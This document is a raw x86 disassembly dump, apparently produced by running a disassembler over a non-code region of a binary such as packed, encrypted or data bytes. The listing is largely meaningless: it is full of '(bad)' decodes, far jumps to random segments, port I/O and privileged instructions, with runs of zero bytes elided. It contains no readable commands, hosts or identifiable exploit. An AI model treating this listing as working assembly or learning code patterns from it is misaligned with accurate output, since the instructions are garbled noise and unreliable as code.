  426fcc:	sub    eax,0x29084fe
  426fd1:	inc    esp
  426fd2:	stos   DWORD PTR es:[edi],eax
  426fd3:	inc    esi
  426fd4:	push   ebx
  426fd5:	cmp    eax,0xe895673
  426fda:	mov    dh,0x53
  426fdc:	fdivr  DWORD PTR [ebx+0x51]
  426fdf:	ficomp DWORD PTR [edi]
  426fe1:	mov    edi,0x4a3bbd64
  426fe6:	jecxz  0x42704a
  426fe8:	xor    dl,BYTE PTR [edi]
  426fea:	mov    cl,0xdf
  426fec:	(bad)  
  426fee:	xchg   edx,eax
  426fef:	jmp    0xe722:0xead23c6d
  426ff6:	xchg   esp,eax
  426ff7:	dec    edx
  426ff8:	sbb    BYTE PTR [ebx-0x62],ah
  426ffb:	shl    DWORD PTR [ebp-0x13],1
  426ffe:	xlat   BYTE PTR ds:[ebx]
  426fff:	in     al,0x6f
  427001:	sub    DWORD PTR [edi-0x57],esp
  427004:	sbb    BYTE PTR [eax+0x5f3f808f],0xc3
  42700b:	test   eax,0x2877b656
  427010:	shl    BYTE PTR [ebx+0x47717a6c],cl
  427016:	repnz add dl,BYTE PTR [esi+eax*2-0x19ec282b]
  42701e:	retf   
  42701f:	inc    edi
  427020:	imul   ebp,DWORD PTR [ebx-0x77],0x8b044fce
  427027:	sbb    dl,bl
  427029:	adc    DWORD PTR [ebx],0xffffffa0
  42702c:	das    
  42702d:	mov    bl,BYTE PTR [edx+0x2f]
  427030:	cmp    edx,DWORD PTR [ecx+ebx*4]
  427033:	inc    edx
  427034:	sar    BYTE PTR [ebx+ebx*4],cl
  427037:	fist   DWORD PTR [eax+0x38]
  42703a:	fcomip st,st(2)
  42703c:	ins    BYTE PTR es:[edi],dx
  42703d:	xchg   edx,eax
  42703e:	sar    BYTE PTR [esi-0x70],1
  427041:	sbb    dl,BYTE PTR [ebx+0x489d970f]
  427047:	and    esp,DWORD PTR [ecx+0x2f]
  42704a:	mov    esp,0x34b3b085
  42704f:	ins    DWORD PTR es:[edi],dx
  427050:	mov    dl,0xdc
  427052:	cld    
  427053:	push   0x5dae190f
  427058:	(bad)  
  42705a:	pop    edi
  42705b:	add    edi,DWORD PTR [edx-0x28]
  42705e:	in     al,0xf6
  427060:	dec    esi
  427061:	(bad)  
  427062:	pop    es
  427063:	pop    edx
  427064:	addr16 loope 0x427001
  427067:	in     eax,0xc7
  427069:	push   0xffffffce
  42706b:	cmp    DWORD PTR [edi],0x7f
  42706e:	and    al,BYTE PTR [edi+esi*1-0x63]
  427072:	jo     0x427033
  427074:	and    ecx,DWORD PTR [eax]
  427076:	rcl    BYTE PTR [ebp+0x46],1
  427079:	or     edx,DWORD PTR [eax-0x5c2a404]
  42707f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427080:	shl    DWORD PTR [eax-0x54c03d37],1
  427086:	popa   
  427087:	test   ecx,esi
  427089:	mov    al,ds:0x79f02661
  42708e:	jp     0x42708b
  427090:	add    BYTE PTR [eax],0x0
	...
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x7199d96
  427102:	inc    esp
  427103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427104:	fsub   DWORD PTR [ecx+0x1050001]
  42710a:	add    BYTE PTR [eax],al
  42710c:	or     BYTE PTR [edx-0x54],0xe8
  427110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427111:	sbb    cx,bx
  427114:	in     ax,dx
  427116:	pop    esi
  427117:	mov    ah,0x95
  427119:	stos   BYTE PTR es:[edi],al
  42711a:	jno    0x4270e8
  42711c:	es sahf 
  42711e:	inc    edx
  42711f:	push   ds
  427120:	pop    edi
  427121:	xchg   ebp,eax
  427122:	nop
  427123:	rol    BYTE PTR [ebx],1
  427125:	mov    ch,BYTE PTR ds:0x47c292d5
  42712b:	pusha  
  42712c:	popa   
  42712d:	in     al,dx
  42712e:	and    eax,0xf7aa6501
  427133:	adc    BYTE PTR [esi+0x41],ch
  427136:	ficomp DWORD PTR [edx-0x1eaeee55]
  42713c:	pop    edx
  42713d:	cmp    al,0x63
  42713f:	push   edx
  427140:	ds out 0x13,al
  427143:	cmp    BYTE PTR [ebx+edi*2-0x76],cl
  427147:	push   0x19
  427149:	mov    al,cl
  42714b:	xchg   ebx,eax
  42714c:	addr16 and al,0x8
  42714f:	mov    edx,0x82197c7f
  427154:	std    
  427155:	push   es
  427156:	mov    edi,0xcb806d30
  42715b:	sbb    BYTE PTR [ebx+0x7096139f],ch
  427161:	in     al,dx
  427162:	xchg   ecx,eax
  427163:	aas    
  427164:	add    al,0x7e
  427166:	ss (bad) 
  427168:	iret   
  427169:	jmp    0x42717e
  42716b:	sub    BYTE PTR [edx-0x31],ah
  42716e:	add    al,0xcc
  427170:	outs   dx,DWORD PTR ds:[esi]
  427171:	cwde   
  427172:	lock push ebx
  427174:	fiadd  DWORD PTR [ebx-0x76321ccf]
  42717a:	mov    esi,0x838a1710
  42717f:	lods   eax,DWORD PTR ds:[esi]
  427180:	mov    ds:0x155b1f02,al
  427185:	stos   BYTE PTR es:[edi],al
  427186:	imul   edi,ebp,0x62e22527
  42718c:	sub    ah,bh
  42718e:	loopne 0x4271f6
  427190:	out    dx,al
  427191:	out    dx,eax
  427192:	add    ch,BYTE PTR [edi+ebp*1-0x612cc22f]
  427199:	jae    0x42714c
  42719b:	(bad)  
  42719c:	push   ds
  42719d:	adc    edx,DWORD PTR [eax-0x44222fdf]
  4271a3:	int3   
  4271a4:	pop    ebp
  4271a5:	dec    ebp
  4271a6:	xchg   DWORD PTR [eax],eax
  4271a8:	push   0x140f172f
  4271ad:	push   ds
  4271ae:	lods   eax,DWORD PTR ds:[esi]
  4271af:	(bad)  
  4271b0:	sbb    eax,0xa0ae41ba
  4271b5:	in     eax,dx
  4271b6:	lods   al,BYTE PTR ds:[esi]
  4271b7:	jle    0x4271b2
  4271b9:	add    BYTE PTR [ecx-0x52c4fb0e],dh
  4271bf:	jmp    0x47b5:0x3f640bd4
  4271c6:	ins    BYTE PTR es:[edi],dx
  4271c7:	aad    0x9e
  4271c9:	push   es
  4271ca:	mov    edx,0x55fe6328
  4271cf:	adc    ecx,DWORD PTR [ebx]
  4271d1:	cli    
  4271d2:	jmp    0x42722b
  4271d4:	jp     0x427246
  4271d6:	(bad)  
  4271d8:	xor    al,0xb9
  4271da:	inc    esi
  4271db:	or     eax,0x24ef47aa
  4271e0:	xchg   edx,eax
  4271e1:	mov    eax,0xd8240628
  4271e6:	mov    fs,WORD PTR [ebx+0x492f7bb4]
  4271ec:	stos   DWORD PTR es:[edi],eax
  4271ed:	sub    esi,ebx
  4271ef:	xor    DWORD PTR [ebx+0x549db397],esi
  4271f5:	jmp    0xcb54:0x995a8f7a
  4271fc:	jl     0x427182
  4271fe:	mov    ds:0x68fd535,al
  427203:	leave  
  427204:	push   0x2
  427206:	out    dx,al
  427207:	aaa    
  427208:	jae    0x427236
  42720a:	xor    eax,edi
  42720c:	cmp    eax,0x3f82938f
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x3738922f,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	loope  0x427249
  42728e:	fist   WORD PTR [edi+0x6c]
  427291:	xor    eax,0xa0944c1d
  427296:	outs   dx,DWORD PTR ds:[esi]
  427297:	mov    edi,0x4e7441a3
  42729c:	xor    al,0x5f
  42729e:	jmp    0x42731b
  4272a0:	gs dec ecx
  4272a2:	jg     0x427292
  4272a4:	add    dh,ah
  4272a6:	dec    ecx
  4272a7:	add    al,0x19
  4272a9:	jmp    0x4272a8
  4272ab:	aaa    
  4272ac:	ret    0x7263
  4272af:	dec    edx
  4272b0:	ss js  0x427282
  4272b3:	xor    eax,0xf9b6ae9d
  4272b8:	jmp    0xd3010bc6
  4272bd:	addr16 pop eax
  4272bf:	jbe    0x427253
  4272c1:	dec    edi
  4272c2:	mov    bl,0xd9
  4272c4:	cmc    
  4272c5:	xlat   BYTE PTR ds:[ebx]
  4272c6:	lea    ecx,[ebp+esi*8-0x6b2fd0b5]
  4272cd:	aam    0x48
  4272cf:	xchg   edi,eax
  4272d0:	fimul  DWORD PTR [ecx-0x25878ef2]
  4272d6:	push   edi
  4272d7:	and    bh,dl
  4272d9:	inc    ebp
  4272da:	cmp    DWORD PTR ss:[edi-0xaeb36bb],esp
  4272e1:	mov    ah,BYTE PTR [edi]
  4272e3:	and    DWORD PTR [eax+0x20],0x16044979
  4272ea:	outs   dx,DWORD PTR ds:[esi]
  4272eb:	mov    edx,esp
  4272ed:	les    ebp,FWORD PTR [ebx+0x1b]
  4272f0:	push   0x41f2b7ab
  4272f5:	shl    DWORD PTR [edi],0x9d
  4272f8:	cmc    
  4272f9:	sub    eax,0x64ddcb86
  4272fe:	jmp    0xc6d35887
  427303:	shl    DWORD PTR [edx+ebx*8-0x65],cl
  427307:	rep stos BYTE PTR es:[edi],al
  427309:	mov    edi,0x49f51f74
  42730e:	push   ebp
  42730f:	js     0x42736b
  427311:	adc    DWORD PTR [edi+edi*2-0x2f],edx
  427315:	aaa    
  427316:	test   DWORD PTR [edx],eax
  427318:	jmp    0xc0f5cee1
  42731d:	repz aas 
  42731f:	(bad)  
  427320:	pop    edx
  427321:	xor    dl,ah
  427323:	jecxz  0x427318
  427325:	cld    
  427326:	xchg   esp,eax
  427327:	sti    
  427328:	retf   
  427329:	sub    bh,BYTE PTR [edx+ebx*4+0x6e]
  42732d:	cwd    
  42732f:	mov    ecx,0xa5f9d5ba
  427334:	in     eax,dx
  427335:	es push cs
  427337:	push   es
  427338:	cmc    
  427339:	add    eax,0x21447042
  42733e:	test   BYTE PTR [edx-0x6b1fdbb7],ch
  427344:	pop    esp
  427345:	fstp   DWORD PTR [esi]
  427347:	iret   
  427348:	dec    esi
  427349:	mov    edx,0x85b77f16
  42734e:	jb     0x427394
  427350:	out    dx,al
  427351:	clc    
  427352:	adc    eax,0x586d2574
  427357:	loop   0x42738b
  427359:	fs popa 
  42735b:	sub    dl,BYTE PTR [ebp*4+0x5763454d]
  427362:	lods   eax,DWORD PTR ds:[esi]
  427363:	les    edi,FWORD PTR [ebp+0x7c7e67ad]
  427369:	scas   eax,DWORD PTR es:[edi]
  42736a:	(bad)  
  42736b:	and    al,0x8f
  42736d:	mov    ah,0x83
  42736f:	test   DWORD PTR [ecx-0x2d7fc630],edi
  427375:	imul   ebx
  427377:	add    edx,ebp
  427379:	pusha  
  42737a:	loope  0x42739a
  42737c:	mov    bh,0xaa
  42737e:	cmp    edx,DWORD PTR [esi+0x26]
  427381:	les    ebx,FWORD PTR [edx-0x21]
  427384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427385:	mov    cl,0x3a
  427387:	sub    BYTE PTR [esi],cl
  427389:	or     BYTE PTR [ebx-0xa01dfb5],dh
  42738f:	test   eax,0xee
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    esi,DWORD PTR [esp+esi*2-0x29]
  427403:	add    esp,edx
  427405:	mov    ds:0x1050001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	push   edi
  42740d:	out    dx,al
  42740e:	aam    0xf0
  427410:	in     eax,dx
  427411:	test   eax,0xcecda7b8
  427416:	pusha  
  427417:	add    bl,bh
  427419:	dec    ebx
  42741a:	je     0x427491
  42741c:	out    dx,eax
  42741d:	mul    edx
  42741f:	cmp    ecx,DWORD PTR [ecx]
  427421:	imul   ebp,DWORD PTR [eax-0xd],0xc16427c9
  427428:	add    DWORD PTR [edi+0x50],ecx
  42742b:	and    eax,0x507ac90f
  427430:	inc    esi
  427431:	rol    BYTE PTR [ebx-0x61],cl
  427434:	jp     0x427443
  427436:	inc    ebx
  427437:	mov    ebx,0x75186e66
  42743c:	add    ebx,DWORD PTR [ebx+ebp*2+0x4ccd33f4]
  427443:	in     eax,0xbc
  427445:	in     al,0x91
  427447:	clc    
  427448:	and    al,0x6c
  42744a:	or     esp,DWORD PTR [eax]
  42744c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42744d:	sbb    edi,DWORD PTR [ebx*4+0x20a74e98]
  427454:	mov    esi,0xa1229ad5
  427459:	int    0x46
  42745b:	jns    0x427437
  42745d:	inc    ebp
  42745e:	cmp    dl,bl
  427460:	xchg   ebx,eax
  427461:	arpl   WORD PTR [eax-0x6e6ed747],bp
  427467:	neg    ebp
  427469:	je     0x42748b
  42746b:	shr    dl,1
  42746d:	xor    BYTE PTR [ebx+ebp*8],dl
  427470:	(bad)  
  427471:	loop   0x42748e
  427473:	gs jmp 0x42745d
  427476:	cmp    esi,DWORD PTR [esi-0x75]
  427479:	xor    BYTE PTR es:[edx-0x32],al
  42747d:	and    DWORD PTR [eax],eax
  42747f:	add    al,0xda
  427481:	add    eax,0xf7d55350
  427486:	sbb    ecx,DWORD PTR [ebx]
  427488:	stc    
  427489:	in     al,dx
  42748a:	into   
  42748b:	jnp    0x427478
  42748d:	mov    ecx,0xe2579da1
  427492:	dec    ebx
  427493:	icebp  
  427494:	mov    DWORD PTR [esi-0x6ddfcace],eax
  42749a:	pop    ebp
  42749b:	retf   0x4df
  42749e:	pop    es
  42749f:	fldcw  WORD PTR [eax-0x53]
  4274a2:	and    DWORD PTR [ebp-0x55fc6c62],ebp
  4274a8:	jns    0x427467
  4274aa:	or     ebp,DWORD PTR [edi+0x7c]
  4274ad:	addr16 mov ch,0xd5
  4274b0:	push   ecx
  4274b1:	push   cs
  4274b2:	xlat   BYTE PTR ds:[ebx]
  4274b3:	pop    ss
  4274b4:	mov    ch,0x79
  4274b6:	out    dx,eax
  4274b7:	lahf   
  4274b8:	mov    esp,0xde4a7cfb
  4274bd:	bound  esi,QWORD PTR [eax-0x5222d409]
  4274c3:	push   0x3a
  4274c5:	xor    BYTE PTR [edx+0x2c],ah
  4274c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274c9:	ja     0x42745f
  4274cb:	fwait
  4274cc:	mov    ebx,esi
  4274ce:	retf   
  4274cf:	into   
  4274d0:	loop   0x427524
  4274d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274d3:	push   esi
  4274d4:	push   es
  4274d5:	mov    edx,0x5b3c1fe5
  4274da:	cdq    
  4274db:	bound  ecx,QWORD PTR [ebp-0x1ed38693]
  4274e1:	or     al,0xd
  4274e3:	xor    DWORD PTR [ecx-0x3b],esi
  4274e6:	xor    BYTE PTR [edi],ch
  4274e8:	inc    esp
  4274e9:	jge    0x42747a
  4274eb:	mov    dh,0x50
  4274ee:	xchg   esi,edx
  4274f0:	xor    DWORD PTR [eax+0x67],esp
  4274f3:	aad    0xd8
  4274f5:	aaa    
  4274f6:	mov    edi,0xbf6e0467
  4274fb:	push   ebp
  4274fc:	ret    
  4274fd:	das    
  4274fe:	cs mov al,0xff
  427501:	paddsb mm7,QWORD PTR [edi+eax*2+0xc00be6e]
  427509:	in     al,0x56
  42750b:	or     BYTE PTR [esi],ah
  42750d:	jecxz  0x42753e
  42750f:	push   edx
  427510:	adc    DWORD PTR [eax],eax
	...
  427572:	add    BYTE PTR [eax],al
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	test   dl,dl
  427582:	ds dec esp
  427584:	out    0xa4,eax
  427586:	add    DWORD PTR [eax],eax
  427588:	add    eax,0xf0000001
  42758d:	repz jmp 0x88e9df3e
  427593:	push   ds
  427594:	arpl   WORD PTR [edx-0x7ecdf7ca],di
  42759a:	mov    ebx,0x5116c19c
  42759f:	rol    DWORD PTR [esp+ebx*2-0xf],0x76
  4275a4:	fsubr  DWORD PTR [edx]
  4275a6:	xchg   BYTE PTR [edi],bl
  4275a8:	push   ds
  4275a9:	ret    0x2d10
  4275ac:	out    0x78,eax
  4275ae:	in     al,0x66
  4275b0:	arpl   WORD PTR [ebp+0x49],di
  4275b3:	mov    DWORD PTR [edx],edx
  4275b5:	sub    BYTE PTR [eax],ah
  4275b7:	or     ebx,DWORD PTR [eax]
  4275b9:	and    ch,bh
  4275bb:	mov    ebp,0x90681418
  4275c0:	leave  
  4275c1:	mov    esi,0x3acd699b
  4275c6:	jle    0x42760c
  4275c8:	mov    fs,esp
  4275ca:	mov    ds:0x6f2e5574,eax
  4275cf:	add    bl,al
  4275d1:	pop    es
  4275d2:	je     0x4275e9
  4275d4:	pop    eax
  4275d5:	imul   ecx,DWORD PTR [eax+0x43],0x28ef40ed
  4275dc:	mov    cl,0xe6
  4275de:	sub    ah,ch
  4275e0:	pushf  
  4275e1:	pop    edi
  4275e2:	loopne 0x42761d
  4275e4:	xchg   DWORD PTR [ebx+0x733e834b],edx
  4275ea:	mov    bl,0xc0
  4275ec:	(bad)  
  4275ed:	jmp    0x4d51fe31
  4275f2:	out    dx,eax
  4275f3:	mov    edi,DWORD PTR [esi-0x50]
  4275f6:	test   eax,0x8b420e7
  4275fb:	xor    BYTE PTR [ecx-0x18],bh
  4275fe:	push   esi
  4275ff:	mov    ch,BYTE PTR [eax]
  427601:	inc    edx
  427602:	in     al,dx
  427603:	in     eax,0x95
  427605:	mov    eax,ds:0x3b147784
  42760a:	inc    ebx
  42760b:	iret   
  42760c:	lods   al,BYTE PTR ds:[esi]
  42760d:	mov    dl,0x4c
  42760f:	into   
  427610:	mov    al,ds:0x80c4aa30
  427615:	mov    ds:0xdcf5d9c4,al
  42761a:	and    DWORD PTR ds:0x70d66abe,eax
  427620:	dec    eax
  427621:	retf   
  427622:	xor    DWORD PTR ds:0xa1b6885a,ecx
  427628:	fldcw  WORD PTR [esi-0x66]
  42762b:	xor    bl,BYTE PTR [ebp+0x1]
  42762e:	pop    edx
  42762f:	jae    0x42767c
  427631:	mov    ds:0xb20f89be,al
  427636:	jb     0x4275f1
  427638:	cmp    bl,bl
  42763a:	push   eax
  42763b:	push   edi
  42763c:	in     eax,0x64
  42763e:	outs   dx,DWORD PTR ds:[esi]
  42763f:	lea    eax,[eax]
  427641:	inc    edi
  427642:	xchg   ebx,eax
  427643:	idiv   DWORD PTR [bx+di-0x4171]
  427648:	or     esp,edi
  42764a:	aad    0x64
  42764c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42764d:	cmp    edi,DWORD PTR [ebp+0x65e88830]
  427653:	push   ebx
  427654:	jne    0x4276cd
  427656:	dec    ebp
  427657:	mov    dl,0x34
  427659:	cs out 0xd,eax
  42765c:	in     al,dx
  42765d:	ss repnz push ebp
  427660:	ins    BYTE PTR es:[edi],dx
  427661:	sbb    eax,0xaf3d719d
  427666:	mul    DWORD PTR [ebx+0x2b]
  427669:	sub    esi,eax
  42766b:	sbb    al,0x3d
  42766d:	sub    bl,ah
  42766f:	sub    ch,dh
  427671:	ja     0x42760e
  427673:	aaa    
  427674:	dec    ebx
  427675:	cmp    eax,0x98d95fa1
  42767a:	add    edi,eax
  42767c:	sbb    al,0x5e
  42767e:	xchg   ecx,eax
  42767f:	pop    esp
  427680:	shl    DWORD PTR [edx-0x23],cl
  427683:	jmp    0x4276b8
  427685:	sahf   
  427686:	cmp    DWORD PTR fs:[esi-0xb],ecx
  42768a:	mov    cl,0x6a
  42768c:	into   
  42768d:	dec    eax
  42768e:	xor    al,0xd4
  427690:	jg     0x427692
	...
  4276f2:	add    BYTE PTR [eax],al
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fstp   DWORD PTR [esi]
  427701:	shl    DWORD PTR ds:0x1a5ec00,0x0
  427708:	add    eax,0xb9000001
  42770d:	fstp   st(0)
  42770f:	xor    cl,bl
  427711:	stos   BYTE PTR es:[edi],al
  427712:	mov    eax,0xb4eff11e
  427717:	push   ebx
  427718:	stos   DWORD PTR es:[edi],eax
  427719:	je     0x427721
  42771b:	xchg   edi,eax
  42771c:	xlat   BYTE PTR ds:[ebx]
  42771d:	std    
  42771e:	jae    0x427792
  427720:	mov    ah,0xa4
  427722:	xor    edi,edi
  427724:	push   ebx
  427725:	xchg   ebx,eax
  427726:	div    edx
  427728:	xor    esi,ebx
  42772a:	xchg   esi,eax
  42772b:	mov    DWORD PTR [esp+ebx*1],ebp
  42772e:	cmp    eax,0x447cf988
  427733:	ins    DWORD PTR es:[edi],dx
  427734:	repnz cmp al,0x17
  427737:	mov    bl,0x86
  427739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42773a:	adc    al,0x1a
  42773c:	xor    al,0x35
  42773e:	cld    
  42773f:	mov    cl,0x11
  427741:	mov    ds:0xa7def505,eax
  427746:	and    al,0xd5
  427748:	cmp    DWORD PTR [ebp-0x27],edx
  42774b:	ret    
  42774c:	outs   dx,DWORD PTR ds:[esi]
  42774d:	mov    al,0xb8
  42774f:	loope  0x42779b
  427751:	je     0x4277bf
  427753:	sbb    cl,BYTE PTR [esp+edi*2+0x1f3b0cbe]
  42775a:	mov    bh,0x1
  42775c:	push   eax
  42775d:	mov    ax,ds:0x84954e5a
  427763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427764:	mov    esi,0x227f3cee
  427769:	mov    cl,BYTE PTR [edi+0x53baf6a0]
  42776f:	icebp  
  427770:	pop    ebx
  427771:	js     0x427720
  427773:	jmp    0xb774:0x81d4d53e
  42777a:	xor    edi,ecx
  42777c:	shr    BYTE PTR [edi],cl
  42777e:	imul   BYTE PTR [edi+eiz*4]
  427781:	inc    ebp
  427782:	int    0x5e
  427784:	sub    cl,BYTE PTR [ebp+0x3a]
  427787:	or     al,0x60
  427789:	dec    esi
  42778a:	nop
  42778b:	loop   0x4277fb
  42778d:	scas   eax,DWORD PTR es:[edi]
  42778e:	ins    BYTE PTR es:[edi],dx
  42778f:	xor    eax,0xaf090897
  427794:	jnp    0x4277f8
  427796:	or     BYTE PTR [esi],bl
  427798:	aam    0xde
  42779a:	outs   dx,BYTE PTR ds:[esi]
  42779b:	and    BYTE PTR [ebp+0x51],dh
  42779e:	loopne 0x4277a3
  4277a0:	push   ss
  4277a1:	push   ds
  4277a2:	or     eax,DWORD PTR [edx-0x4f]
  4277a5:	lds    ebp,FWORD PTR [eax+0x25]
  4277a8:	dec    ebx
  4277a9:	lods   eax,DWORD PTR ds:[esi]
  4277aa:	sahf   
  4277ab:	inc    edi
  4277ac:	pop    ds
  4277ad:	imul   esi,DWORD PTR [ebp-0x5b],0x38
  4277b1:	jg     0x427756
  4277b3:	xchg   esi,eax
  4277b4:	pop    edi
  4277b5:	pop    edi
  4277b6:	pop    es
  4277b7:	ficomp WORD PTR [ebx]
  4277b9:	and    BYTE PTR [ebp-0x17],dh
  4277bc:	or     ebp,DWORD PTR [ebp-0x35]
  4277bf:	les    ebx,FWORD PTR [edx]
  4277c1:	pop    eax
  4277c2:	lea    ecx,[ecx]
  4277c4:	inc    eax
  4277c5:	dec    eax
  4277c6:	push   0xffffffb5
  4277c8:	dec    ebx
  4277c9:	out    0xd9,al
  4277cb:	mov    eax,0x321092a
  4277d0:	push   ebp
  4277d1:	or     al,0xe9
  4277d3:	dec    edx
  4277d4:	push   ss
  4277d5:	cli    
  4277d6:	pop    esp
  4277d7:	adc    al,0x45
  4277d9:	push   cs
  4277da:	jge    0x4277a4
  4277dc:	rcr    al,cl
  4277de:	jl     0x4277af
  4277e0:	pop    edx
  4277e1:	dec    edx
  4277e2:	sbb    edx,DWORD PTR [edx]
  4277e4:	mov    cl,0xe0
  4277e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4277e7:	leave  
  4277e8:	cmp    DWORD PTR [esi-0x1d],eax
  4277eb:	add    al,0xe8
  4277ed:	push   cs
  4277ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277ef:	dec    ecx
  4277f0:	(bad)  
  4277f1:	mov    ebp,0x425bf925
  4277f6:	(bad)  
  4277f7:	out    0x5c,al
  4277f9:	out    0xd1,eax
  4277fb:	int3   
  4277fc:	ss push ebp
  4277fe:	mov    ds:0x7e33215e,al
  427803:	jp     0x427848
  427805:	arpl   bp,bp
  427807:	mov    edx,0xaed4ad00
  42780c:	fs mov es,edi
  42780f:	push   esp
  427810:	popf   
	...
  427871:	add    BYTE PTR [eax],al
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	mov    eax,ds:0xf19d0153
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    eax,0x53000001
  42788d:	adc    eax,0x47fc9c9
  427892:	mov    ecx,0x40aeab64
  427897:	or     BYTE PTR [ecx+eiz*4],0x73
  42789b:	fsubr  st,st(2)
  42789d:	add    al,0xb7
  42789f:	call   0x3d72:0xf9fba508
  4278a6:	clc    
  4278a7:	and    DWORD PTR [edx],ebp
  4278a9:	xchg   DWORD PTR [ebx-0x65],edx
  4278ac:	sub    esp,DWORD PTR [eax-0x2abbe25a]
  4278b2:	mov    ebp,0xf8b03b90
  4278b7:	sbb    al,0xda
  4278b9:	cmp    DWORD PTR [ecx-0x6f],ebp
  4278bc:	pop    es
  4278bd:	xchg   esi,eax
  4278be:	aas    
  4278bf:	sub    dl,0x50
  4278c2:	and    al,0x4d
  4278c4:	lods   al,BYTE PTR ds:[esi]
  4278c5:	and    al,0xd8
  4278c7:	mov    bh,0x0
  4278c9:	add    al,0x33
  4278cb:	hlt    
  4278cc:	and    al,0xe3
  4278ce:	or     eax,DWORD PTR [ecx]
  4278d0:	jbe    0x42792d
  4278d2:	pop    ebx
  4278d3:	dec    esp
  4278d4:	fst    QWORD PTR [edx+ebp*1]
  4278d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278d8:	xlat   BYTE PTR ds:[ebx]
  4278d9:	xor    ch,bh
  4278db:	in     eax,0x7e
  4278dd:	dec    esp
  4278de:	stos   DWORD PTR es:[edi],eax
  4278df:	clc    
  4278e0:	daa    
  4278e1:	add    BYTE PTR [ecx-0x1f65d264],bh
  4278e7:	xchg   ebx,esp
  4278e9:	mov    esp,0xf49ca81f
  4278ee:	es or  edi,0x4a
  4278f2:	out    0x84,al
  4278f4:	jne    0x427890
  4278f6:	(bad)  
  4278f7:	lds    eax,FWORD PTR ds:0xddbdf6e7
  4278fd:	ja     0x427958
  4278ff:	dec    ebp
  427900:	mov    ecx,0x9a4a40df
  427905:	cmp    DWORD PTR [ecx-0x3c],0xda126bdb
  42790c:	jo     0x42789c
  42790e:	je     0x8c38b5c6
  427914:	jnp    0x427986
  427916:	int    0x7d
  427918:	scas   al,BYTE PTR es:[edi]
  427919:	mov    esi,0xfde037ca
  42791e:	add    DWORD PTR [ebx-0xa],ecx
  427921:	popa   
  427922:	nop
  427923:	enter  0x384d,0x2b
  427927:	bound  ebp,QWORD PTR [ecx-0x3c5d016c]
  42792d:	mov    ds:0x87ecd031,al
  427932:	mov    ds:0x3303978,al
  427937:	xor    eax,0x8774d5e5
  42793c:	push   ebp
  42793d:	jmp    0xe46f5190
  427942:	add    esp,ecx
  427944:	fistp  WORD PTR [eax]
  427946:	jo     0x42795f
  427948:	mov    edi,0x5b4bbb83
  42794d:	cmp    eax,0xa292261f
  427952:	pop    ebp
  427953:	stos   BYTE PTR es:[edi],al
  427954:	inc    ebp
  427955:	div    BYTE PTR [edi]
  427957:	leave  
  427958:	or     bl,BYTE PTR [edi-0x7b2aeee0]
  42795e:	sti    
  42795f:	leave  
  427960:	xchg   esi,eax
  427961:	aad    0x65
  427963:	adc    eax,0x4fd03ee4
  427968:	aas    
  427969:	mov    ebx,0xfd2fdfc6
  42796e:	sbb    al,0x53
  427970:	push   cs
  427971:	mov    edx,0x6e9686e0
  427976:	stos   BYTE PTR es:[edi],al
  427977:	and    DWORD PTR cs:[edi-0x512cc58a],esi
  42797e:	sbb    esp,DWORD PTR [ebx+eiz*8-0x63]
  427982:	cmp    BYTE PTR [ebx],ch
  427984:	push   es
  427985:	dec    esp
  427986:	and    bl,BYTE PTR [ecx-0x80]
  427989:	out    0x9f,al
  42798b:	mov    al,ds:0x68e4e92f
  427990:	cmp    DWORD PTR [eax],eax
	...
  4279f2:	add    BYTE PTR [eax],al
  4279f4:	call   0xdea3:0xffa3ffdd
  4279fb:	std    
  4279fc:	inc    edx
  4279fd:	jne    0x4279d7
  4279ff:	sbb    DWORD PTR [ebp-0x9f7e5e3],0xffffffa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    eax,0xa1000001
  427a0d:	push   ds
  427a0e:	push   edi
  427a0f:	sub    BYTE PTR [ebp+0x1e856dc2],cl
  427a15:	xor    ch,bh
  427a17:	in     eax,0xd
  427a19:	adc    al,0xca
  427a1b:	xor    eax,0x2cd4a47a
  427a20:	push   ss
  427a21:	stos   BYTE PTR es:[edi],al
  427a22:	inc    ebx
  427a23:	xor    al,0x2b
  427a25:	mov    dh,0xa2
  427a27:	in     al,0x35
  427a29:	pop    esp
  427a2a:	adc    DWORD PTR [eax+edi*1],esp
